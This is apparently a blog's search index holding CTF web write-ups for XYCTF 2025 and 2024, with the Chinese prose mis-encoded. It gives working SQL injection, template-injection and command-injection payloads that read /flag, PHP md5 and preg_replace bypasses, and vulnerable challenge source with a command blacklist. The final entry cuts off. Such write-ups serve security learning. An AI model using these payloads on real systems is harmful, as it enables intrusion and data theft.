<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>xyctf2025webéƒ¨åˆ†wp</title>
      <link href="/2025/04/09/xyctf2025web%E9%83%A8%E5%88%86wp/"/>
      <url>/2025/04/09/xyctf2025web%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h3 id="XYCTF2025"><a href="#XYCTF2025" class="headerlink" title="XYCTF2025"></a>XYCTF2025</h3><h4 id="ezsql-æ‰‹åŠ¨æ»‘ç¨½-ï¼š"><a href="#ezsql-æ‰‹åŠ¨æ»‘ç¨½-ï¼š" class="headerlink" title="ezsql(æ‰‹åŠ¨æ»‘ç¨½)ï¼š"></a>ezsql(æ‰‹åŠ¨æ»‘ç¨½)ï¼š</h4><p>(çœŸçš„æ²¡æœ‰æƒ³åˆ°æ˜¯å®½å­—èŠ‚æ³¨å…¥,ç¬¬ä¸€æ¬¡åšï¼Œæ²¡æœ‰åšå‡ºæ¥ï¼Œé—®å­¦é•¿è¦wpï¼Œæˆ‘è¿˜æ²¡æœ‰å¤ç°å‡ºæ¥ï¼Œæˆ‘æ˜¯å‚»é€¼ï¼Œç°åœ¨åªèƒ½å¤ç°äº†)</p><p>é¦–å…ˆçœ‹è§é¢˜ç›®æ˜¯sqlæ³¨å…¥æ¼æ´ï¼Œæ‰“å¼€æ˜¯è®©ä½ ç™»å½•å¹³å°ï¼Œç„¶åå°±fuzzæµ‹è¯•è¿‡æ»¤äº†ç©ºæ ¼,è½¬ä¹‰äº†â€™(æ‰€ä»¥è¦å®½å­—èŠ‚æ³¨å…¥)ï¼Œå…³é”®å­—åˆ°æ˜¯æ²¡æœ‰</p><p>ç„¶åå°±æ˜¯ä½¿ç”¨substringè¿™ä¸ªå‡½æ•°ï¼š</p><p>è§£é‡Šï¼š</p><p>SUBSTRING(str, pos, len)ï¼š</p><ul><li><code>str</code>ï¼šè¡¨ç¤ºè¦ä»ä¸­æå–å­å­—ç¬¦ä¸²çš„åŸå§‹å­—ç¬¦ä¸²ã€‚</li><li><code>pos</code>ï¼šæŒ‡å®šå­å­—ç¬¦ä¸²çš„èµ·å§‹ä½ç½®ã€‚è‹¥ä¸ºæ­£æ•°ï¼Œåˆ™ä»å­—ç¬¦ä¸²çš„å¼€å¤´å¼€å§‹è®¡æ•°ï¼›è‹¥ä¸ºè´Ÿæ•°ï¼Œåˆ™ä»å­—ç¬¦ä¸²çš„æœ«å°¾å¼€å§‹è®¡æ•°ã€‚</li><li><code>len</code>ï¼šæŒ‡å®šè¦æå–çš„å­å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1&#x27;%09or%09substring(database()%09FROM%092%09FOR%091)=&#x27;a&#x27;%23&amp;password=1(çˆ†åº“)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27;%09OR%09substring((select%09table_name%09from%09information_schema.tables%09where%09table_schema=&#x27;testdb&#x27;%09limit%091%09offset%090)%09FROM%091%09FOR%091)=&#x27;a&#x27;%23&amp;password=1(çˆ†è¡¨)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27;%09OR%09case%09when%09(ascii(substring((select%09column_name%09from%09information_schema.columns%09where%09table_name=&#x27;double_check&#x27;%09limit%091)%09FROM%092%09FOR%091))=116)%09then%091%09else%090%09end=1%23&amp;password=1(çˆ†åˆ—)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27;%09OR%09case%09when%09(ascii(substring((select%09secret%09from%09double_check%09limit%091)%09FROM%092%09FOR%091))=116)%09then%091%09else%090%09end=1%23&amp;password=1</span><br></pre></td></tr></table></figure><p>ç„¶åå°±åƒè¿™æ ·ä¸€ä¸ªä¸€ä¸ªæµ‹è¯•ï¼Œæ‹¿åˆ°ï¼šdtfrtkcc0czkoua9S</p><p>åŒç†ï¼šè¿™æ ·ä¸€ä¸ªä¸ªæµ‹å‡ºæ¥è´¦å·å’Œå¯†ç ï¼šyudeyoushang&#x2F;zhonghengyishengï¼Œè¿›å»ä¹‹åç›´æ¥è¿›è¡ŒRCEå°±okäº†</p><h4 id="ez-puzzleï¼š"><a href="#ez-puzzleï¼š" class="headerlink" title="ez_puzzleï¼š"></a>ez_puzzleï¼š</h4><p>è¿™ä¸ªä»–è¦ä½ è¿›è¡Œæ‹¼å›¾ï¼Œå°æ¸¸æˆå…ˆæŸ¥çœ‹jså°±è¡Œï¼Œå‘ç°ä¸è®©æˆ‘çœ‹ï¼Œè‚¯å®šæœ‰å¥½ä¸œè¥¿ï¼Œç›´æ¥ctrl+shift+iæŸ¥çœ‹ï¼ŒçŸ¥é“æ˜¯å°å¼¹çª—ï¼Œjsé‡Œé¢æœç´¢alertå°±è¡Œäº†ï¼Œå‘ç°æœ‰åˆ¤æ–­æ¡ä»¶ï¼Œå°†å°äºå·æ”¹æˆå¤§äºå·å°±è¡Œï¼Œç„¶åå†æ‹¼ä¸€æ¬¡å°±è¡Œäº†ã€‚</p><h4 id="å‡ºé¢˜äººå·²ç–¯ï¼š"><a href="#å‡ºé¢˜äººå·²ç–¯ï¼š" class="headerlink" title="å‡ºé¢˜äººå·²ç–¯ï¼š"></a>å‡ºé¢˜äººå·²ç–¯ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">@File    :   app.py</span><br><span class="line">@Time    :   2025/03/29 15:52:17</span><br><span class="line">@Author  :   LamentXU </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">import bottle</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">flag in /flag</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">@bottle.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return &#x27;Hello, World!&#x27;</span><br><span class="line">@bottle.route(&#x27;/attack&#x27;)</span><br><span class="line">def attack():</span><br><span class="line">    payload = bottle.request.query.get(&#x27;payload&#x27;)</span><br><span class="line">    if payload and len(payload) &lt; 25 and &#x27;open&#x27; not in payload and &#x27;\\&#x27; not in payload:</span><br><span class="line">        return bottle.template(&#x27;hello &#x27;+payload)</span><br><span class="line">    else:</span><br><span class="line">        bottle.abort(400, &#x27;Invalid payload&#x27;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    bottle.run(host=&#x27;0.0.0.0&#x27;, port=5000)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># å®šä¹‰/attackè·¯å¾„çš„è·¯ç”±</span><br><span class="line">@bottle.route(&#x27;/attack&#x27;)</span><br><span class="line">def attack():</span><br><span class="line">    # ä»è¯·æ±‚çš„æŸ¥è¯¢å‚æ•°ä¸­è·å–payload</span><br><span class="line">    payload = bottle.request.query.get(&#x27;payload&#x27;)</span><br><span class="line">    # æ£€æŸ¥payloadæ˜¯å¦å­˜åœ¨ï¼Œé•¿åº¦æ˜¯å¦å°äº25ï¼Œå¹¶ä¸”ä¸åŒ…å«openå’Œ\å­—ç¬¦</span><br><span class="line">    if payload and len(payload) &lt; 25 and &#x27;open&#x27; not in payload and &#x27;\\&#x27; not in payload:</span><br><span class="line">        # ä½¿ç”¨bottleçš„æ¨¡æ¿åŠŸèƒ½è¿”å›åŒ…å«payloadçš„é—®å€™è¯­</span><br><span class="line">        return bottle.template(&#x27;hello &#x27;+payload)</span><br><span class="line">    else:</span><br><span class="line">        # å¦‚æœæ¡ä»¶ä¸æ»¡è¶³ï¼Œè¿”å›400é”™è¯¯</span><br><span class="line">        bottle.abort(400, &#x27;Invalid payload&#x27;)</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´</p><p>éœ€è¦å°è¯•æ„é€ å‡ºå°äº25ï¼Œå¹¶ä¸”ä¸åŒ…å«openå’Œ\å­—ç¬¦çš„æœ‰æ•ˆè´Ÿè½½æˆ–è€…æ‰¾åˆ°ä¸€ç§æ–¹å¼ç»•è¿‡å°äº25çš„é™åˆ¶(ä¸è¿‡ä»–æ˜¯bottle)</p><p>ç»è¿‡æµ‹è¯•å‘ç°å¯ä»¥ä½¿ç”¨unicodeç»•è¿‡ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%7b%7b%ba%70%65%6e%28%27%2f%66%6c%61%67%27%29%2e%72%65%61%64%28%29%7d%7d</span><br></pre></td></tr></table></figure><p>ä¸è¿‡oå¯ä»¥ä½¿ç”¨%baè¿›è¡Œç»•è¿‡(ç”¨æ–œä½“ç»•è¿‡ï¼Œnb)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å¤ç°xyctf2024</title>
      <link href="/2025/04/07/%E5%A4%8D%E7%8E%B0xyctf2024/"/>
      <url>/2025/04/07/%E5%A4%8D%E7%8E%B0xyctf2024/</url>
      
        <content type="html"><![CDATA[<h3 id="XYCTF"><a href="#XYCTF" class="headerlink" title="XYCTF:"></a>XYCTF:</h3><h4 id="EZhttp"><a href="#EZhttp" class="headerlink" title="EZhttp:"></a>EZhttp:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¿›è¡ŒdirsearchæŸ¥çœ‹æœ‰æ²¡æœ‰å…¶ä»–ä¸œè¥¿ï¼›å‘ç°robots.txtæ–‡ä»¶ï¼Œç„¶åä¸€æ­¥ä¸€æ­¥è¿›è¡Œï¼Œå‘ç°è´¦å·å’Œå¯†ç </span><br><span class="line"></span><br><span class="line">å‘ç°è¯´ä¸æ˜¯yuanshen.comçš„ä¸è¦ï¼›</span><br><span class="line"></span><br><span class="line">æ”¹refererï¼›Referer:yuanshen.com</span><br><span class="line"></span><br><span class="line">å‘ç°è¯´ä¸æ˜¯XYCTFçš„æµè§ˆå™¨ï¼›</span><br><span class="line"></span><br><span class="line">æ”¹UAå¤´ï¼›User-Agent: XYCTF</span><br><span class="line"></span><br><span class="line">å‘ç°ä¸æ˜¯æœ¬åœ°ç”¨æˆ·ä¸èƒ½è®¿é—®ï¼›</span><br><span class="line"></span><br><span class="line">client-IP:127.0.0.1</span><br><span class="line"></span><br><span class="line">å‘ç°ä¸æ˜¯ymzx.qq.comçš„ä»£ç†;</span><br><span class="line"></span><br><span class="line">æ”¹via; via:ymzx.qq.com</span><br><span class="line"></span><br><span class="line">å‘ç°æƒ³åƒcookieçš„å°é¥¼å¹²ï¼›</span><br><span class="line"></span><br><span class="line">æ”¹cookieä¸ºXYCTF;è·å¾—flag</span><br></pre></td></tr></table></figure><h4 id="EZMAKE"><a href="#EZMAKE" class="headerlink" title="EZMAKE:"></a>EZMAKE:</h4><p>å…ˆæµ‹è¯•ä¸€ä¸‹ä¸€äº›å‘½ä»¤ï¼›ç„¶åè¯•è¯•æ–°å­¦çš„echo $(&lt;flag)è¿™ä¸ªå‘½ä»¤æ˜¯å°†flagç»™é‡å®šå‘å‡ºæ¥ç„¶åechoå‡ºæ¥</p><p>å‘ç°è¢«è¿‡æ»¤åŒå†™è¯•è¯•å¾—åˆ°flag</p><h4 id="ez-Make"><a href="#ez-Make" class="headerlink" title="ez?Make:"></a>ez?Make:</h4><p>ç„¶åä¸Šé¢çš„æ–¹æ³•ç”¨ä¸äº†äº†ï¼›å¯ä»¥è¯•è¯•pwdæŸ¥çœ‹å½“å‰çš„ç›®å½•ï¼›ç„¶åçœ‹çœ‹cd ..å¯ä»¥ç”¨å—ï¼Œå‘ç°å¯ä»¥ä½¿ç”¨ï¼›</p><p>okäº†ï¼Œå¯ä»¥cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;more [d-h][k-m][k-m][9-z][]e-hè¿›è¡Œæ­£åˆ™åŒ¹é…</p><h4 id="ÎµZ-Â¿Ğ¼-KÎµÂ¿"><a href="#ÎµZ-Â¿Ğ¼-KÎµÂ¿" class="headerlink" title="ÎµZ?Â¿Ğ¼@KÎµÂ¿?:"></a>ÎµZ?Â¿Ğ¼@KÎµÂ¿?:</h4><p>å‘ç°&#x2F;^[$|(|)|@|[|]|{|}|&lt; | &gt;|-]+$&#x2F;åªèƒ½ä½¿ç”¨è¿™é‡Œé¢çš„ç¬¦å·,é‚£flagæ€ä¹ˆåŠï¼›</p><p>åº”è¯¥æ˜¯ç‰¹æ®Šç¬¦å·è¡¨ç¤ºflagæµ‹è¯•å‘ç°$&lt;å¯ä»¥è¡¨ç¤ºflagï¼Œç„¶ååœ¨linuxé‡Œé¢$()ä¹Ÿæ˜¯å¯ä»¥è¿›è¡Œæ‰“å°çš„ï¼›</p><p>ç„¶å$(&lt;$&lt;)æ‰“å°flag,ä½†æ˜¯æœ‰è¿‡æ»¤ï¼›è¿›è¡ŒåŒå†™ç»•è¿‡ï¼›å‡ºæ¥flagäº†</p><h4 id="EZRCE"><a href="#EZRCE" class="headerlink" title="EZRCE:"></a>EZRCE:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;\\&#x27;,&#x27;\&#x27;&#x27;,&#x27;$&#x27;,&#x27;&lt;&#x27;];</span><br></pre></td></tr></table></figure><p>åªèƒ½ä½¿ç”¨è¿™ä¸ªå‘ç°æ˜¯0-9 ç„¶åæœ‰&lt;å¯ä»¥è¿›è¡Œé‡å®šå‘æ“ä½œï¼›ä½¿ç”¨8è¿›åˆ¶ä»¥åŠbashä¸­çš„stringè¯­æ³•ï¼›</p><p>?cmd&#x3D;$â€™\154\163â€™ (ls)å‘ç°å­˜åœ¨æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨é‡å®šå‘æ“ä½œç»™flagæ‰“å°å‡ºæ¥;?cmd&#x3D;$â€™\143\141\164â€™&lt;$â€™\057\146\154\141\147â€™</p><p>(cat &lt;&#x2F;flag)</p><h4 id="EZCLASS"><a href="#EZCLASS" class="headerlink" title="EZCLASS:"></a>EZCLASS:</h4><p>å‘ç°æŠ¥é”™å¯ä»¥æƒ³åˆ°å¼‚å¸¸ç±»ï¼›new Error()-&gt;getMessage()èƒ½å¤Ÿè·å–åˆ°å­—ç¬¦ä¸²</p><p>a&#x3D;Error&amp;b&#x3D;Error&amp;aa&#x3D;system&amp;bb&#x3D;cat &#x2F;[a-z][a-z]*&amp;c&#x3D;getMessage</p><h4 id="EZPOP"><a href="#EZPOP" class="headerlink" title="EZPOP:"></a>EZPOP:</h4><h4 id="warm-up"><a href="#warm-up" class="headerlink" title="warm up:"></a>warm up:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`&lt;?phpinclude &#x27;next.php&#x27;;highlight_file(__FILE__);$XYCTF = &quot;Warm up&quot;;extract($_GET);if (isset($_GET[&#x27;val1&#x27;]) &amp;&amp; isset($_GET[&#x27;val2&#x27;]) &amp;&amp; $_GET[&#x27;val1&#x27;] != $_GET[&#x27;val2&#x27;] &amp;&amp; md5($_GET[&#x27;val1&#x27;]) == md5($_GET[&#x27;val2&#x27;])) &#123;  echo &quot;ez&quot; . &quot;&lt;br&gt;&quot;;&#125; else &#123;  die(&quot;ä»€ä¹ˆæƒ…å†µ,è¿™ä¹ˆåŸºç¡€çš„md5åšä¸æ¥&quot;);&#125;if (isset($md5) &amp;&amp; $md5 == md5($md5)) &#123;  echo &quot;ezez&quot; . &quot;&lt;br&gt;&quot;;&#125; else &#123;  die(&quot;ä»€ä¹ˆæƒ…å†µ,è¿™ä¹ˆåŸºç¡€çš„md5åšä¸æ¥&quot;);&#125;if ($XY == $XYCTF) &#123;  if ($XY != &quot;XYCTF_550102591&quot; &amp;&amp; md5($XY) == md5(&quot;XYCTF_550102591&quot;)) &#123;    echo $level2;  &#125; else &#123;    die(&quot;ä»€ä¹ˆæƒ…å†µ,è¿™ä¹ˆåŸºç¡€çš„md5åšä¸æ¥&quot;);  &#125;&#125; else &#123;  die(&quot;å­¦è¿™ä¹ˆä¹…,ä¼ å‚ä¸ä¼šä¼ ?&quot;);&#125;`ä»€ä¹ˆæƒ…å†µ,è¿™ä¹ˆåŸºç¡€çš„md5åšä¸æ¥</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå°±æ˜¯md5ç»•è¿‡äº†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?val1[]=1&amp;val2[]=2&amp;md5=0e215962017&amp;XY=0e215962017&amp;XYCTF=0e215962017</span><br></pre></td></tr></table></figure><p>é¦–å…ˆä½¿ç”¨æ•°ç»„ç»•è¿‡ç„¶å0e215962017è¿™ä¸ªæ˜¯ä»–æ˜¯md5å€¼ç­‰äºä»–è‡ªå·±</p><p>ç„¶åè®¿é—®ï¼šLLeeevvveeelll222.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`&lt;?phphighlight_file(__FILE__);if (isset($_POST[&#x27;a&#x27;]) &amp;&amp; !preg_match(&#x27;/[0-9]/&#x27;, $_POST[&#x27;a&#x27;]) &amp;&amp; intval($_POST[&#x27;a&#x27;])) &#123;  echo &quot;æ“ä½œä½ O.o&quot;;  echo preg_replace($_GET[&#x27;a&#x27;],$_GET[&#x27;b&#x27;],$_GET[&#x27;c&#x27;]); // æˆ‘å¯ä¸ä¼šåƒåˆ«äººä¸€æ ·è®¾ç½®10æ¥ä¸ªlevel&#125; else &#123;  die(&quot;æœ‰ç‚¹æ±—æµæµƒèƒŒ&quot;);&#125;`</span><br><span class="line">**Warning**: preg_match() expects parameter 2 to be string, array given in **/var/www/html/LLeeevvveeelll222.php** on line **3**</span><br><span class="line">æ“ä½œä½ O.o</span><br><span class="line">**Warning**: preg_replace(): Empty regular expression in **/var/www/html/LLeeevvveeelll222.php** on line **5**</span><br></pre></td></tr></table></figure><p>ç„¶åæ•°ç»„å¯ä»¥ç»•è¿‡preg_mathå’Œpreg_match </p><p>POST:a[]&#x3D;1</p><p>GET:?a&#x3D;&#x2F;1&#x2F;e&amp;b&#x3D;(æƒ³æ‰§è¡Œçš„å‘½ä»¤)&amp;c&#x3D;test(ç»“æŸ)</p><h4 id="ç‰¢ç‰¢è®°ä½ï¼Œé€è€…ä¸ºå¤§"><a href="#ç‰¢ç‰¢è®°ä½ï¼Œé€è€…ä¸ºå¤§" class="headerlink" title="ç‰¢ç‰¢è®°ä½ï¼Œé€è€…ä¸ºå¤§:"></a>ç‰¢ç‰¢è®°ä½ï¼Œé€è€…ä¸ºå¤§:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`&lt;?phphighlight_file(__FILE__);function Kobe($cmd)&#123;  if (strlen($cmd) &gt; 13) &#123;    die(&quot;see you again~&quot;);  &#125;  if (preg_match(&quot;/echo|exec|eval|system|fputs|\.|\/|\\|/i&quot;, $cmd)) &#123;    die(&quot;è‚˜æ­»ä½ &quot;);  &#125;  foreach ($_GET as $val_name =&gt; $val_val) &#123;    if (preg_match(&quot;/bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/i&quot;, $val_val)) &#123;      return &quot;what can i say&quot;;    &#125;  &#125;  return $cmd;&#125;$cmd = Kobe($_GET[&#x27;cmd&#x27;]);echo &quot;#man,&quot; . $cmd . &quot;,manba out&quot;;echo &quot;&lt;br&gt;&quot;;eval(&quot;#man,&quot; . $cmd . &quot;,mamba out&quot;);`#man,,manba out</span><br></pre></td></tr></table></figure><p>é¦–å…ˆé™åˆ¶æˆ‘ä»¬ä¼ cmdçš„é•¿åº¦è¦åœ¨å°äº13ï¼Œç„¶åè¿‡æ»¤äº†ä¸€äº›å‘½ä»¤</p><p>å› ä¸ºæ˜¯å•è¡Œæ³¨é‡Šï¼Œåˆ©ç”¨urlç¼–ç ç»™ä»–æ·»åŠ %0aï¼ˆæ¢è¡Œç¬¦å¯¹åº”URLç¼–ç ,æ¥ä¸‹æ¥æ˜¯æ‰§è¡Œè¯­å¥ï¼Œæˆ‘ä»¬æš‚æ—¶æ”¾ä¸€è¾¹ï¼Œæ­¤æ—¶è¦æƒ³åŠæ³•è®©åè¾¹çš„ä¸æ‰§è¡Œï¼Œå› æ­¤åˆ©ç”¨URLç¼–ç æ·»åŠ %23å³#å·æ³¨é‡Šæ‰åè¾¹çš„ï¼Œæ­¤æ—¶ä¸­é—´å°±å¯ä»¥å†™shelläº†ã€‚</p><p>é•¿åº¦çš„è¯å¯ä»¥ä¼ æ–°çš„å‚æ•°cmd&#x3D;%0a<code>$_GET[a]</code>;%23</p><p>è¿™ä¸ªæ–°çš„å‚æ•°açš„è¯å¯ä»¥æ‰§è¡Œå‘½ä»¤ä½†æ˜¯éœ€è¦è¿›è¡Œbashæ‰§è¡Œï¼Œå³8è¿›åˆ¶(è®°å¾—åŠ $â€™â€™)</p><p>è¿™é‡Œæˆ‘ç”¨çš„æ˜¯ï¼ša&#x3D;cp &#x2F;flag nn å°±æ˜¯å°†&#x2F;flagç»™å¤åˆ¶ä¸‹æ¥ï¼Œç„¶åè®¿é—®nnçš„æ—¶å€™ä¼šè‡ªåŠ¨ä¸‹è½½å‡ºæ¥ï¼Œç„¶åflagå°±å‡ºæ¥äº†ï¼Œä¸è¿‡è¦è®°å¾—ç”¨bashæ‰§è¡Œ</p><h4 id="æˆ‘æ˜¯ä¸€ä¸ªå¤è¯»æœº-ï¼š"><a href="#æˆ‘æ˜¯ä¸€ä¸ªå¤è¯»æœº-ï¼š" class="headerlink" title="æˆ‘æ˜¯ä¸€ä¸ªå¤è¯»æœº ï¼š"></a>æˆ‘æ˜¯ä¸€ä¸ªå¤è¯»æœº ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import *</span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line">app = flask(__name__)</span><br><span class="line">app.secret_key = &#x27;lzlcnb&#x27;  # è®¾ç½®ä¼šè¯å¯†é’¥ï¼Œç”¨äºåŠ å¯†ä¼šè¯æ•°æ®</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;get&#x27;, &#x27;post&#x27;])</span><br><span class="line">def login():</span><br><span class="line">    if request.method == &#x27;post&#x27;:</span><br><span class="line">        username = request.form[&#x27;username&#x27;]</span><br><span class="line">        password = request.form[&#x27;password&#x27;]</span><br><span class="line"></span><br><span class="line">        # è¿›è¡Œç™»å½•éªŒè¯é€»è¾‘ï¼Œå¦‚éªŒè¯ç”¨æˆ·åå¯†ç æ˜¯å¦åŒ¹é…ç­‰</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        # ç™»å½•éªŒè¯æˆåŠŸ</span><br><span class="line">        if username==&#x27;admin&#x27; and password==&#x27;asdqwe&#x27;:</span><br><span class="line">            session[&#x27;username&#x27;] = username</span><br><span class="line">            return redirect(&#x27;/index&#x27;)</span><br><span class="line">  </span><br><span class="line">    return render_template(&#x27;login.html&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/index&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    if &#x27;username&#x27; in session:</span><br><span class="line">        try:</span><br><span class="line">            # word=request.args.get(&#x27;sentence&#x27;)</span><br><span class="line">         </span><br><span class="line">            # if word==&quot;&#123;&#123;&#125;&#125;&quot;:</span><br><span class="line">            #     word=none</span><br><span class="line">            flag=0</span><br><span class="line">            word = request.args.get(&#x27;sentence&#x27;)</span><br><span class="line">        </span><br><span class="line">            balck_array=[&#x27;[&#x27;,&#x27;]&#x27;,&#x27;_&#x27;,&#x27;config&#x27;,&#x27;url_for&#x27;,&#x27;system&#x27;,&#x27;flag&#x27;,&#x27;file&#x27;,&#x27;os&#x27;,&#x27;&quot;&#x27;,&quot;&#x27;&quot;,&#x27;cat&#x27;,&#x27;system&#x27;,&#x27;eval&#x27;,&#x27;more&#x27;,&#x27;tail&#x27;,&#x27;less&#x27;,&#x27;base64&#x27;,&#x27;file&#x27;,&#x27;nc&#x27;,&#x27;python&#x27;,&#x27;exec&#x27;,&#x27;&#123;&#x27;,&#x27;&#125;&#x27;]</span><br><span class="line">            for i in balck_array:</span><br><span class="line">                if word!=none and i in word:</span><br><span class="line">                    word=&quot;what are you doing,little hacker&quot;</span><br><span class="line">                    break</span><br><span class="line">            if word is not none:</span><br><span class="line">                for i in range(len(word)):</span><br><span class="line">                    if ord(word[i])&amp;gt;128:</span><br><span class="line">                        word=&#x27;&#123;&#x27;+word[0:i]+word[i+1:]+&#x27;&#125;&#x27;</span><br><span class="line"></span><br><span class="line">                        flag+=1</span><br><span class="line">            else:</span><br><span class="line">                word=&quot;what do you want to say&quot;</span><br><span class="line">            if flag:</span><br><span class="line">                word=&quot;æˆ‘åªèƒ½çœ‹æ‡‚ä½ è¯´çš„è‹±æ–‡(ï¼ï¹ï¼œ)&quot;+word</span><br><span class="line"></span><br><span class="line">            if &quot;&#123;&#123;&#125;&#125;&quot; in word:</span><br><span class="line">                word = word.replace(&quot;&#123;&#123;&#125;&#125;&quot;,&#x27;&#123; &#123;&#125;&#125;&#x27;)</span><br><span class="line">            html=&#x27;&#x27;&#x27;</span><br><span class="line">        &amp;lt;!doctype html&amp;gt;</span><br><span class="line">&amp;lt;html&amp;gt;</span><br><span class="line">&amp;lt;head&amp;gt;</span><br><span class="line">    &amp;lt;title&amp;gt;æˆ‘æ˜¯ä¸€ä¸ªå¤è¯»æœº&amp;lt;/title&amp;gt;</span><br><span class="line">    &amp;lt;style&amp;gt;</span><br><span class="line">        body &#123;&#123;</span><br><span class="line">            font-family: arial, sans-serif;</span><br><span class="line">            background-image: url(&#x27;/static/yourname.jpg&#x27;); /* æ›¿æ¢ &#x27;background.jpg&#x27; ä¸ºæ‚¨æƒ³è¦è®¾ç½®çš„èƒŒæ™¯å›¾ç‰‡è·¯å¾„ */</span><br><span class="line">            background-size: cover;</span><br><span class="line">            background-position: center;</span><br><span class="line">            margin: 0;</span><br><span class="line">            padding: 0;</span><br><span class="line">            display: flex;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            align-items: center;</span><br><span class="line">            height: 100vh;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">        form &#123;&#123;</span><br><span class="line">            background-color: rgba(255, 255, 255, 0.8);</span><br><span class="line">            padding: 20px;</span><br><span class="line">            border-radius: 8px;</span><br><span class="line">            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);</span><br><span class="line">            width: 800px;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">        h2 &#123;&#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">            color: #333;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">        label &#123;&#123;</span><br><span class="line">            display: block;</span><br><span class="line">            margin-top: 10px;</span><br><span class="line">            color: #555;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">        input[type=&quot;text&quot;],</span><br><span class="line">        input[type=&quot;password&quot;] &#123;&#123;</span><br><span class="line">            width: 100%;</span><br><span class="line">            padding: 8px;</span><br><span class="line">            margin-top: 4px;</span><br><span class="line">            border: 1px solid #ccc;</span><br><span class="line">            border-radius: 4px;</span><br><span class="line">            box-sizing: border-box;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">        input[type=&quot;submit&quot;] &#123;&#123;</span><br><span class="line">            width: 100%;</span><br><span class="line">            padding: 8px;</span><br><span class="line">            margin-top: 10px;</span><br><span class="line">            background-color: #007bff;</span><br><span class="line">            color: #fff;</span><br><span class="line">            border: none;</span><br><span class="line">            border-radius: 4px;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">        input[type=&quot;submit&quot;]:hover &#123;&#123;</span><br><span class="line">            background-color: #0056b3;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">    &amp;lt;/style&amp;gt;</span><br><span class="line">&amp;lt;/head&amp;gt;</span><br><span class="line">&amp;lt;body&amp;gt;</span><br><span class="line">    &amp;lt;form action=&quot;/index&quot; method=&quot;get&quot;&amp;gt;</span><br><span class="line">        &amp;lt;h2&amp;gt;æˆ‘çš„å®ï¼Œä½ è¯´ä»€ä¹ˆæˆ‘å°±è¯´ä»€ä¹ˆ&amp;lt;/h2&amp;gt;</span><br><span class="line">        &amp;lt;label for=&quot;sentence&quot;&amp;gt;ä½ æƒ³è¯´çš„è¯&amp;lt;/label&amp;gt;</span><br><span class="line">        &amp;lt;input type=&quot;text&quot; id=&quot;sentence&quot; name=&quot;sentence&quot; required&amp;gt;</span><br><span class="line"></span><br><span class="line">        &amp;lt;input type=&quot;submit&quot; value=&quot;tell me&quot;&amp;gt;</span><br><span class="line">        &amp;lt;h2&amp;gt;&#123;&#125;&amp;lt;/h2&amp;gt;</span><br><span class="line">    &amp;lt;/form&amp;gt;</span><br><span class="line">&amp;lt;/body&amp;gt;</span><br><span class="line">&amp;lt;/html&amp;gt;&#x27;&#x27;&#x27;.format(word)</span><br><span class="line">    </span><br><span class="line">            return render_template_string(html)</span><br><span class="line">        except exception  as e:</span><br><span class="line">            return &quot;å‡ºç°äº†ä¸€ç‚¹å°é—®é¢˜&quot;</span><br><span class="line">    else:</span><br><span class="line">        return redirect(&#x27;/&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,debug=true,port=8080)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>çœ‹æºç 